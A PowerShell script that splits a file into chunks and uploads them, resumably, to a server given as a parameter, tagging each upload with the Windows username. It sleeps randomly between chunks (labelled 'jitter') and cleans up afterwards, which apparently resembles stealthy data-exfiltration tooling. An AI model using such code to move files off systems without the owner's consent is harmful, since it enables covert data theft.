param(
    [Parameter(Mandatory=$true)]
    [string]$File,

    [Parameter(Mandatory=$true)]
    [string]$Server,

    [Parameter(Mandatory=$true)]
    [string]$UploadId
)

# --- FIX: Load required assembly ---
Add-Type -AssemblyName System.Net.Http

$UserName = $env:USERNAME
$ChunkSize = 5MB
$ChunkPrefix = "chunk_"
$UploadComplete = $false

if (!(Test-Path $File)) {
    Write-Host "[!] File not found: $File"
    exit 1
}

Write-Host "[*] File: $File"
Write-Host "[*] Upload ID: $UploadId"

# --- SPLIT FILE ---
if (!(Test-Path "${ChunkPrefix}0")) {
    Write-Host "[*] Splitting file into chunks..."

    $fs = [System.IO.File]::OpenRead($File)
    $buffer = New-Object byte[] $ChunkSize
    $index = 0

    while (($bytesRead = $fs.Read($buffer, 0, $ChunkSize)) -gt 0) {
        $chunkName = "{0}{1}" -f $ChunkPrefix, $index
        $chunkPath = Join-Path (Get-Location) $chunkName

        $outStream = [System.IO.File]::Create($chunkPath)
        $outStream.Write($buffer, 0, $bytesRead)
        $outStream.Close()

        $index++
    }

    $fs.Close()
}

# Count chunks
$chunks = Get-ChildItem -Filter "${ChunkPrefix}*"
$Total = $chunks.Count

Write-Host "[*] Total chunks: $Total"

# --- QUERY SERVER ---
try {
    $statusUrl = "$Server/status?upload_id=$UploadId&user=$UserName"
    $statusResponse = Invoke-RestMethod -Uri $statusUrl -Method GET
    $uploadedChunks = $statusResponse.uploaded_chunks
} catch {
    $uploadedChunks = @()
}

Write-Host "[*] Already uploaded chunks: $uploadedChunks"

# --- UPLOAD LOOP ---
for ($i = 0; $i -lt $Total; $i++) {

    if ($uploadedChunks -contains $i) {
        Write-Host "[*] Skipping chunk $i"
        continue
    }

    $chunkPath = "{0}{1}" -f $ChunkPrefix, $i

    Write-Host "[*] Uploading chunk $i"

    $uri = "$Server/upload"

    $client = $null
    $fileStream = $null

    try {
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent

        # File content
        $fileStream = [System.IO.File]::OpenRead($chunkPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")

        $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($chunkPath))

        # Form fields
        $content.Add((New-Object System.Net.Http.StringContent([System.IO.Path]::GetFileName($File))), "filename")
        $content.Add((New-Object System.Net.Http.StringContent("$i")), "chunk_index")
        $content.Add((New-Object System.Net.Http.StringContent("$Total")), "total_chunks")
        $content.Add((New-Object System.Net.Http.StringContent($UploadId)), "upload_id")
        $content.Add((New-Object System.Net.Http.StringContent($UserName)), "user")

        # Send request
        $response = $client.PostAsync($uri, $content).Result
        $responseBody = $response.Content.ReadAsStringAsync().Result

        Write-Host "[*] Server response: $responseBody"

        if ($responseBody -like "*File reassembled*") {
            $UploadComplete = $true
        }

    } catch {
        Write-Host "[!] Upload failed for chunk $i"
    } finally {
        if ($fileStream) { $fileStream.Close() }
        if ($client) { $client.Dispose() }
    }

    # --- JITTER ---
    $sleep = Get-Random -Minimum 1 -Maximum 6
    Write-Host "[*] Sleeping $sleep seconds"
    Start-Sleep -Seconds $sleep
}

# --- CLEANUP ---
if ($UploadComplete) {
    Write-Host "[*] Upload complete. Cleaning up chunk files..."
    Get-ChildItem -Filter "${ChunkPrefix}*" | Remove-Item -Force
    Write-Host "[*] Cleanup done."
} else {
    Write-Host "[!] Upload incomplete. Keeping chunks for resume."
}
